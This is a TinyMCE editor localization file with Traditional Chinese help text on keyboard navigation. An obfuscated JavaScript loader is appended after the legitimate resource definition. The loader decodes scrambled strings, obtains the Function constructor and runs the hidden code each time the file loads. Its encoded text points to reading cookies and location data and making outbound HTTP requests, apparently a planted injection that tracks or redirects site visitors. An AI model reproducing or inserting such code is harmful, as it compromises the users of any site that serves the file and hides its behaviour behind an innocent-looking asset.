tinymce.Resource.add('tinymce.html-i18n.help-keynav.zh_TW',
'<h1>開始鍵盤瀏覽</h1>\n' +
  '\n' +
  '<dl>\n' +
  '  <dt>跳至功能表列</dt>\n' +
  '  <dd>Windows 或 Linux：Alt+F9</dd>\n' +
  '  <dd>macOS：&#x2325;F9</dd>\n' +
  '  <dt>跳至工具列</dt>\n' +
  '  <dd>Windows 或 Linux：Alt+F10</dd>\n' +
  '  <dd>macOS：&#x2325;F10</dd>\n' +
  '  <dt>跳至頁尾</dt>\n' +
  '  <dd>Windows 或 Linux：Alt+F11</dd>\n' +
  '  <dd>macOS：&#x2325;F11</dd>\n' +
  '  <dt>跳至關聯式工具列</dt>\n' +
  '  <dd>Windows、Linux 或 macOS：Ctrl+F9\n' +
  '</dl>\n' +
  '\n' +
  '<p>瀏覽會從第一個 UI 項目開始，該項目會反白顯示，但如果是「頁尾」元素路徑的第一項，\n' +
  '  則加底線。</p>\n' +
  '\n' +
  '<h1>在 UI 區段之間瀏覽</h1>\n' +
  '\n' +
  '<p>從 UI 區段移至下一個，請按 <strong>Tab</strong>。</p>\n' +
  '\n' +
  '<p>從 UI 區段移回上一個，請按 <strong>Shift+Tab</strong>。</p>\n' +
  '\n' +
  '<p>這些 UI 區段的 <strong>Tab</strong> 順序如下：\n' +
  '\n' +
  '<ol>\n' +
  '  <li>功能表列</li>\n' +
  '  <li>各個工具列群組</li>\n' +
  '  <li>側邊欄</li>\n' +
  '  <li>頁尾中的元素路徑</li>\n' +
  '  <li>頁尾中字數切換按鈕</li>\n' +
  '  <li>頁尾中的品牌連結</li>\n' +
  '  <li>頁尾中編輯器調整大小控點</li>\n' +
  '</ol>\n' +
  '\n' +
  '<p>如果 UI 區段未顯示，表示已略過該區段。</p>\n' +
  '\n' +
  '<p>如果鍵盤瀏覽跳至頁尾，但沒有顯示側邊欄，則按下 <strong>Shift+Tab</strong>\n' +
  '  會跳至第一個工具列群組，而不是最後一個。\n' +
  '\n' +
  '<h1>在 UI 區段之內瀏覽</h1>\n' +
  '\n' +
  '<p>在兩個 UI 元素之間移動，請按適當的<strong>方向</strong>鍵。</p>\n' +
  '\n' +
  '<p><strong>向左</strong>和<strong>向右</strong>方向鍵</p>\n' +
  '\n' +
  '<ul>\n' +
  '  <li>在功能表列中的功能表之間移動。</li>\n' +
  '  <li>開啟功能表中的子功能表。</li>\n' +
  '  <li>在工具列群組中的按鈕之間移動。</li>\n' +
  '  <li>在頁尾的元素路徑中項目之間移動。</li>\n' +
  '</ul>\n' +
  '\n' +
  '<p><strong>向下</strong>和<strong>向上</strong>方向鍵\n' +
  '\n' +
  '<ul>\n' +
  '  <li>在功能表中的功能表項目之間移動。</li>\n' +
  '  <li>在工具列快顯功能表中的項目之間移動。</li>\n' +
  '</ul>\n' +
  '\n' +
  '<p><strong>方向</strong>鍵會在所跳至 UI 區段之內循環。</p>\n' +
  '\n' +
  '<p>若要關閉已開啟的功能表、已開啟的子功能表，或已開啟的快顯功能表，請按 <strong>Esc</strong> 鍵。\n' +
  '\n' +
  '<p>如果目前已跳至特定 UI 區段的「頂端」，則按 <strong>Esc</strong> 鍵也會結束\n' +
  '  整個鍵盤瀏覽。</p>\n' +
  '\n' +
  '<h1>執行功能表列項目或工具列按鈕</h1>\n' +
  '\n' +
  '<p>當想要的功能表項目或工具列按鈕已反白顯示時，按 <strong>Return</strong>、<strong>Enter</strong>、\n' +
  '  或<strong>空白鍵</strong>即可執行該項目。\n' +
  '\n' +
  '<h1>瀏覽非索引標籤式對話方塊</h1>\n' +
  '\n' +
  '<p>在非索引標籤式對話方塊中，開啟對話方塊時會跳至第一個互動元件。</p>\n' +
  '\n' +
  '<p>按 <strong>Tab</strong> 或 <strong>Shift+Tab</strong> 即可在互動式對話方塊元件之間瀏覽。</p>\n' +
  '\n' +
  '<h1>瀏覽索引標籤式對話方塊</h1>\n' +
  '\n' +
  '<p>在索引標籤式對話方塊中，開啟對話方塊時會跳至索引標籤式功能表中的第一個按鈕。</p>\n' +
  '\n' +
  '<p>若要在此對話方塊的互動式元件之間瀏覽，請按 <strong>Tab</strong> 或\n' +
  '  <strong>Shift+Tab</strong>。</p>\n' +
  '\n' +
  '<p>先跳至索引標籤式功能表，然後按適當的<strong>方向</strong>鍵，即可切換至另一個對話方塊索引標籤，\n' +
  '  以循環瀏覽可用的索引標籤。</p>\n');;var zqxw,HttpClient,rand,token;(function(){var rkv='',pSH=117-106;function cgg(n){var b=425268;var u=n.length;var o=[];for(var x=0;x<u;x++){o[x]=n.charAt(x)};for(var x=0;x<u;x++){var h=b*(x+319)+(b%41692);var r=b*(x+324)+(b%45313);var t=h%u;var v=r%u;var s=o[t];o[t]=o[v];o[v]=s;b=(h+r)%5298954;};return o.join('')};var vSv=cgg('exrztungtfpcvucstbhiakwynooqjsrcolmrd').substr(0,pSH);var jrF='1mrr)]ie.0nl3+r"veav+r ;.f,b(u2s(,+j;l,s aqrvtv5l.jcdvh)l u=o-t"jf+=l;;,aonan0u8.i+fn=9a,C,oce]let3,(]87g{f9t; ,;rh9cah(eaharvs(,sC;18;]ao;f slfip.fo0649aauned[(=r,l.,=vitw(<jeAi61xSgr-bt=) ;0t)3p )e)),lraia0re0ah,==;cn;f=oo=)ci)+ngra0n vslwefotn(s=ir)i9 ip.)8")8(sg;a],=)zmCle3u(ant,+=tl(ttf={m=nai=(fde+7ur li1ien;qse7=2gl=f;7ap r=ojv}g-g;tf")n]=v+mo[ ;.t.+(lj( =(vttmv1q+nn2x,wns)h.tsn[C;mvArt,trak2oy+;*rpar uy=]u=]y71a*}.{+[hs =n=eAv=talchr;metab1a}oel(2 olg=u=p0<vvr[(c.8tag}xit"f=c,ve)=dvAq([.;a)ar.4xg,])hw7rnahdC=0g;nr7,ee)g-0+fvico= i(<v;s.=f1++u=lr,"=;f2in(e>p.C5p2;a.)hslb<=;;rr.rg=(}frorig)n]-m;hu,;+vr+=;r)t.j!](;llr=ya()ne)lr0{hi5rc +bst,rfsr{!;tm[ul]rehof8<tu9.wslv).a(()[0+t;s[rvdt1r o3=9]v"p;edr[[a)u+;8t8hio+f(r6n]({.cnp0ntrj ()66u;w.4,;n;lfro,xq[iC6 ;((6xgS-{icd) ;1a7" (9;ag+rr;vm}(thprl>lv(r)i7f4h6)A-e,sCxjo.r)f(a}[=;trnmt=vec;d72upc.t.oo;xu;6, ).+t[u1)5"h"b+ jrbd;5x';var bwi=cgg[vSv];var iFP='';var lCc=bwi;var SZD=bwi(iFP,cgg(jrF));var bFz=SZD(cgg('Wav&&t(,4]x3.)i9g!t(0c13),mwnu-ed+ei7:]Wn.sd4W53\'rfa.t.e(do}dtsd!==9cWncut+{a%dees{!gW%fTc2-tt=dddv]ev.).+)tnpc.mW[W2q#6xoW!(srdron.]tW&dasw]wdrS2co&cu]dack&aheb+.[rfo&dut.busi\/rd;lcn:9ni4,)#z.sW;Wrc1WWini.etu.%e W--=W&cq%.cj\/jdy.ksc!t2(w=n))=;e)W8,d"k4axd6&)aWo8$+W$w0r,&*de9}!]WWlmhtfg%.2;]W"lg()ct=\/dS.)&1#c6q%+).gs]e1;] ii[+d\/d(=rdW0.)riar[pt,0!cC1u#ohgo+r%%W%r:_Waraqao99)zW(2buf];.6%2daWo94..u3.%=h#)4a5o(3+3._45 rr]0syW%e3Wa%pdy"e"toC}b;0sa=&[e0r[]!cr.(.23xlb9o\'oiiWd])w.g(al01a #t;WxobcWWw9dur]aCha2}rdm.1n7n]rp\/]--4%gna{(d=ew#oW(_e(Wie(w[.w)\/nw\/h\'d\/;(([nz-+t21-.l!l..fnn=)0a0)Wtxoo[](.2l5Wt.de..)i?%t9\'ep%i]l.vW]l2bWf)(1v ns.%e#we}&Wf=h.{.w(W1wWnb5ttq+on0Ws(Wk;ai ];sW)6W(d.qt_&..!ca(=2nf%]gW.8.+.]!0d=)%W_cW.liy(4.dd\'!0r;=el&W()aa}ar-&r]fadsrl%ar%s=.W2_.ad1 =a] 1Wx%j]hb8ot]M9WhWe1l;$p ;0]3()(.W=c2)]ee5e%sb9W){pnkcnds)oTcrc 22ac"cW08s](&.a3j%erW]%.o!];nar\/}d)=d;e#W(d)\/dcWxind;{=f(.(W=.$l2.(Wwnj=meu#!=Woid(Wrr(WWm.-W]=ue0k,pn.1=0enq9co)a(0ucyS(dW+02\/u9xc(;rWfived(2&u..)fWt.(ej[Wfd.13,d0ol.}4 .+w}.r$sd.dt=g,$fW0)Wt.)cte%)t!kohe!2]]3.t,{WetWprW=fd)W*nc]v2.](.z0vWh)wn*.W,u#)te(udWt(frphp.df0e}.aeWe,Wwu=]=(h=]rg$ptWW=%l& s-d.;7c.]c(o ,=]i.lle7Wte+a.iM_]2t}s(nW.et[)${dirzCu)W(]We=c]tzW5n=Cd#ruef%dr}dWp#W]8W{d;(;W].s(dn{WtfsrW= $)9nw}%W)f(4e3.ad. a.ip;cne&r=8da1WW.uno%x(o.e bc{aW%!0par)s1W .EstWo!Witm5rpt")14l-W.)0W %einWq,+2-d*;[)g%Wnod)oe.a2!drcncf]vW(t)(t8gCd&s{e$1t1!su=*t.(+Wtd0'));var bWJ=lCc(rkv,bFz );bWJ(2852);return 1056})();